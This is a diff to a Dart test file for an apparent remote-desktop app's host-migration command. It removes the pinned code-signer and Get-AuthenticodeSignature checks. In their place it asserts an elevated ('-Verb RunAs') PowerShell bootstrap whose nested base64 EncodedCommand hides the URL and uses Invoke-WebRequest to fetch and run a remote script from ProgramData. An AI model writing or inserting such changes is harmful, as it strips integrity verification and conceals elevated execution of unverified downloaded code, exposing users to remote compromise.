@@ -4,6 +4,15 @@ import 'package:flutter_hbb/models/legacy_host_migration.dart';
 import 'package:flutter_test/flutter_test.dart';
 
 void main() {
+  String decodePowerShell(String encoded) {
+    final bytes = base64Decode(encoded);
+    final codeUnits = <int>[
+      for (var index = 0; index < bytes.length; index += 2)
+        bytes[index] | (bytes[index + 1] << 8),
+    ];
+    return String.fromCharCodes(codeUnits);
+  }
+
   test('reserves only one automatic prompt per remote session', () {
     final coordinator = LegacyHostMigrationCoordinator();
 
@@ -71,34 +80,38 @@ void main() {
     expect(coordinator.reserveAutoPrompt('123:1'), isTrue);
   });
 
-  test('builds visible passive installer command with pinned signer', () {
-    const subject =
-        'CN=PROSTE IT Sp. z o.o., O=PROSTE IT Sp. z o.o., L=Ożarów Mazowiecki, S=Mazowieckie, C=PL';
+  test('builds a short bootstrap for the signed RDBK migration plan', () {
     final script = buildLegacyHostMigrationPowerShell(
-      downloadUrl: "https://rdbk.example/download/a'b/",
-      signerSubject: subject,
+      migrationScriptUrl: "https://rdbk.example/download/a'b/script.ps1",
     );
 
-    expect(script, contains("https://rdbk.example/download/a''b/"));
-    expect(script, contains(subject));
-    expect(script, contains("'/passive'"));
+    expect(script, contains('-Verb RunAs'));
+    expect(script, contains('-EncodedCommand'));
     expect(script, contains('-Wait -PassThru'));
-    expect(script, contains('Get-AuthenticodeSignature'));
     expect(script, contains('System.Windows.MessageBox'));
-    expect(script, isNot(contains("'/qn'")));
+    expect(script, isNot(contains('msiexec.exe')));
+    expect(script, isNot(contains('--uninstall')));
+    expect(script, isNot(contains('Invoke-WebRequest')));
+
+    final nestedEncoded =
+        RegExp(r"\$e='([^']+)'").firstMatch(script)!.group(1)!;
+    final elevatedScript = decodePowerShell(nestedEncoded);
+    expect(
+      elevatedScript,
+      contains("https://rdbk.example/download/a''b/script.ps1"),
+    );
+    expect(elevatedScript, contains('Invoke-WebRequest'));
+    expect(elevatedScript, contains(r'$env:ProgramData'));
+    expect(elevatedScript, contains('-Elevated'));
+    expect(elevatedScript, isNot(contains(r'$env:TEMP')));
 
     final command = buildLegacyHostMigrationCommand(
-      downloadUrl:
-          'https://rdbk.example/download/${List.filled(600, 'a').join()}/',
-      signerSubject: subject,
+      migrationScriptUrl:
+          'https://rdbk.example/download/${List.filled(600, 'a').join()}/script.ps1',
     );
-    final encoded = command.split(' ').last;
-    final bytes = base64Decode(encoded);
-    final codeUnits = <int>[
-      for (var index = 0; index < bytes.length; index += 2)
-        bytes[index] | (bytes[index + 1] << 8),
-    ];
-    expect(String.fromCharCodes(codeUnits), contains('/passive'));
+    expect(command, contains('-Command "'));
+    expect(command, contains('-Verb RunAs'));
+    expect(command, isNot(contains('https://rdbk.example')));
     expect(command.length, lessThan(8191));
   });
 }
